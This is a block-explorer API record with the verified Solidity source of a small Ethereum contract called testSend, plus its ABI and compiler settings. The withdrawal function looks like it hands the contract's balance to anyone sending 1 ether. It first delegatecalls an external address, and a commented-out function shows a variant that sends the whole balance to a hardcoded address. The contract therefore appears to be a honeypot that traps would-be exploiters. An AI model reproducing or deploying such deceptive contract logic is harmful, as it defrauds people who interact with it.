{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.4.19;\r\ncontract loglib {\r\n   mapping (address => uint256) public sendList;\r\n   \r\n   function logSendEvent() payable public{\r\n        sendList[msg.sender] = 1 ether;\r\n   }\r\n   \r\n   /*function logSendEvent() payable public{\r\n       address addr = 0xe3632684dB2BCE417dF118686F315872b2Fc4E3D;\r\n       require(addr.send(this.balance));\r\n   }*/\r\n   \r\n}\r\n\r\ncontract testSend\r\n{\r\n    address Owner=msg.sender;\r\n    uint256 public Limit= 1 ether;\r\n    address log = 0x623354A5a3b36F3781c6140311820ce5B727eeFc;\r\n\r\n    function()payable public{}\r\n    \r\n    function withdrawal()\r\n    payable public\r\n    {\r\n\r\n        if(msg.value>=Limit)\r\n        {\r\n            log.delegatecall(bytes4(sha3(\"logSendEvent()\")));\r\n            msg.sender.send(this.balance);\r\n        }\r\n    }\r\n\r\n    function kill() public {\r\n        require(msg.sender == Owner);\r\n        selfdestruct(msg.sender);\r\n    }\r\n\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Limit\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdrawal\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"testSend","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://8d89a18640210d5515048952ef87df2e8d5cfae51036c64dece61f13240bb40e"}]}